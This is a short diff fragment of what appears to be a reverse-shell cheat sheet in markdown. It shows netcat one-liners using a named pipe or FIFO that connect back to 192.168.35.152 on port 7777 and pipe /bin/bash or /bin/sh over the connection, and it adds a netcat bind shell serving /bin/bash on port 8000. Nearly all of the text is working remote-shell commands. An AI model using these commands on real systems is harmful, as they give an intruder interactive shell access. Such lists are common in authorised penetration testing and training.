@@ -41,6 +41,9 @@ mknod backpipe p && nc 192.168.35.152 7777 0<backpipe | /bin/bash 1>backpipe
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.35.152 7777 >/tmp/f
 ```
 
+```
+nc -lvnp 8000 -e /bin/bash
+```
 ## ncat
 
 ```bash
